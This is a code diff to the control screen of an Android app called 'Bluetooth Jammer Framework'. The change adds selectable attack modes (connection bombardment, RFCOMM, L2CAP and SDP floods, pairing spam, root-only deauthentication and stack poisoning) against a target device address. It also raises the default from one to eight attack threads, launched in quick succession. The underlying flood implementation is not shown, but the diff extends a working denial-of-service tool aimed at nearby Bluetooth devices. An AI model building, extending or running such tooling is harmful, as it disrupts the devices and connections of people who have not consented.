@@ -6,18 +6,23 @@ import android.graphics.text.LineBreaker
 import android.os.Build
 import android.os.Bundle
 import android.util.Log
+import android.widget.RadioGroup
+import android.widget.ScrollView
 import android.widget.Toast
 import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.text.isDigitsOnly
 import androidx.core.widget.doAfterTextChanged
+import api.AttackMode
 import api.L2capFloodAttack
 import com.google.android.material.button.MaterialButton
 import com.google.android.material.materialswitch.MaterialSwitch
+import com.google.android.material.radiobutton.MaterialRadioButton
 import com.google.android.material.textview.MaterialTextView
 import com.google.android.material.textfield.TextInputEditText
 import java.util.Date
 import util.Logger
+import util.RootUtils
 import kotlin.math.log
 
 class AttackActivity : AppCompatActivity() {
@@ -29,16 +34,19 @@ class AttackActivity : AppCompatActivity() {
     private lateinit var buttonStartStop: MaterialButton
     private lateinit var logAttack: MaterialTextView
     private lateinit var switchLog: MaterialSwitch
+    private lateinit var radioGroupAttackMode: RadioGroup
+    private lateinit var scrollViewLog: ScrollView
 
     // Initialize detail info
     private lateinit var deviceName: String
     private lateinit var address: String
-    private var threads: Int = 1
+    private var threads: Int = 8
+    private var selectedAttackMode: AttackMode = AttackMode.MULTI_VECTOR
 
     companion object {
         @JvmStatic
         var isAttacking = false
-        var FrameworkVersion = 1.0
+        var FrameworkVersion = 2.0
         var loggingStatus = true
     }
 
@@ -61,13 +69,65 @@ class AttackActivity : AppCompatActivity() {
         buttonStartStop = findViewById(R.id.buttonStartStop)
         logAttack = findViewById(R.id.logTextView)
         switchLog = findViewById(R.id.switchLogView)
+        radioGroupAttackMode = findViewById(R.id.radioGroupAttackMode)
+        scrollViewLog = findViewById(R.id.scrollViewLog)
 
         // Set text views
-        viewDeviceName.text = "Device Name: $deviceName"
-        viewDeviceAddress.text = "Address: $address"
+        viewDeviceName.text = deviceName
+        viewDeviceAddress.text = address
         viewThreads.setText("$threads")
         logAttack.justificationMode = LineBreaker.JUSTIFICATION_MODE_INTER_WORD
-        Logger.appendLog(logAttack, "Bluetooth Jammer Framework Version: $FrameworkVersion")
+        
+        // Enable auto-scroll for logs
+        logAttack.addTextChangedListener(object : android.text.TextWatcher {
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
+            override fun afterTextChanged(s: android.text.Editable?) {
+                scrollViewLog.post { scrollViewLog.fullScroll(ScrollView.FOCUS_DOWN) }
+            }
+        })
+        
+        // Check root status and disable root modes if not rooted
+        val isRooted = RootUtils.isRooted()
+        val radioRootDeauth: MaterialRadioButton = findViewById(R.id.radioRootDeauth)
+        val radioRootStackPoison: MaterialRadioButton = findViewById(R.id.radioRootStackPoison)
+        
+        if (!isRooted) {
+            radioRootDeauth.isEnabled = false
+            radioRootStackPoison.isEnabled = false
+            radioRootDeauth.alpha = 0.5f
+            radioRootStackPoison.alpha = 0.5f
+        }
+        
+        Logger.appendLog(logAttack, "═══════════════════════════════════════")
+        Logger.appendLog(logAttack, "Bluetooth Jammer Framework v$FrameworkVersion")
+        Logger.appendLog(logAttack, "═══════════════════════════════════════")
+        Logger.appendLog(logAttack, "Target: $deviceName")
+        Logger.appendLog(logAttack, "Address: $address")
+        Logger.appendLog(logAttack, "Root Status: ${if (isRooted) "✓ AVAILABLE" else "✗ NOT AVAILABLE"}")
+        Logger.appendLog(logAttack, "═══════════════════════════════════════\n")
+
+        // Attack Mode Selection Listener
+        radioGroupAttackMode.setOnCheckedChangeListener { _, checkedId ->
+            selectedAttackMode = when (checkedId) {
+                R.id.radioMultiVector -> AttackMode.MULTI_VECTOR
+                R.id.radioBombardment -> AttackMode.CONNECTION_BOMBARDMENT
+                R.id.radioRfcommFlood -> AttackMode.RFCOMM_FLOOD
+                R.id.radioL2cap -> AttackMode.L2CAP_ATTACK
+                R.id.radioPairingSpam -> AttackMode.PAIRING_SPAM
+                R.id.radioSdpFlood -> AttackMode.SDP_FLOODING
+                R.id.radioRootDeauth -> AttackMode.ROOT_DEAUTH
+                R.id.radioRootStackPoison -> AttackMode.ROOT_STACK_POISON
+                else -> AttackMode.MULTI_VECTOR
+            }
+            Logger.appendLog(logAttack, "Mode selected: ${selectedAttackMode.displayName}")
+            Logger.appendLog(logAttack, "Description: ${selectedAttackMode.description}")
+            if (selectedAttackMode.requiresRoot && !isRooted) {
+                Logger.appendLog(logAttack, "⚠️ WARNING: This mode requires root access!\n")
+            } else {
+                Logger.appendLog(logAttack, "")
+            }
+        }
 
 
 
@@ -105,20 +165,36 @@ class AttackActivity : AppCompatActivity() {
     @SuppressLint("MissingPermission")
     private fun startAttack() {
         isAttacking = true
-        buttonStartStop.text = "Stop"
+        buttonStartStop.text = "STOP ATTACK"
+        buttonStartStop.setIconResource(android.R.drawable.ic_media_pause)
         BluetoothAdapter.getDefaultAdapter().cancelDiscovery()
-        Logger.appendLog(logAttack, "Attack Started! Address: $address ($deviceName) | Threads: $threads")
-        Toast.makeText(this@AttackActivity, "PLEASE FORCE CLOSE APP IF YOU WANT STOP THE ATTACK!", Toast.LENGTH_LONG).show()
-        for (i in 1..threads) L2capFloodAttack(address).startAttack(this, logAttack)
+        
+        Logger.appendLog(logAttack, "═══════════════════════════════════════")
+        Logger.appendLog(logAttack, "⚡ ATTACK STARTED!")
+        Logger.appendLog(logAttack, "═══════════════════════════════════════")
+        Logger.appendLog(logAttack, "Mode: ${selectedAttackMode.displayName}")
+        Logger.appendLog(logAttack, "Threads: $threads")
+        Logger.appendLog(logAttack, "═══════════════════════════════════════\n")
+        
+        Toast.makeText(this@AttackActivity, "Attack started: ${selectedAttackMode.displayName}", Toast.LENGTH_SHORT).show()
+        
+        // Start threads rapidly
+        for (i in 0 until threads) {
+            val delayMs = i * 100L  // 0.1 seconds
+            L2capFloodAttack(address, selectedAttackMode).startAttack(this, logAttack, threadId = i, delayMs = delayMs)
+        }
     }
 
     @SuppressLint("MissingPermission")
     private fun stopAttack() {
         isAttacking = false
-        buttonStartStop.text = "Start"
-        Logger.appendLog(logAttack, "Attack Stopped! Force close this app..")
+        buttonStartStop.text = "START ATTACK"
+        buttonStartStop.setIconResource(android.R.drawable.ic_media_play)
+        Logger.appendLog(logAttack, "\n═══════════════════════════════════════")
+        Logger.appendLog(logAttack, "⏹ ATTACK STOPPED!")
+        Logger.appendLog(logAttack, "═══════════════════════════════════════\n")
         BluetoothAdapter.getDefaultAdapter().startDiscovery()
-        L2capFloodAttack(address).stopAttack()
+        L2capFloodAttack(address, selectedAttackMode).stopAttack()
     }
 
     override fun onDestroy() {
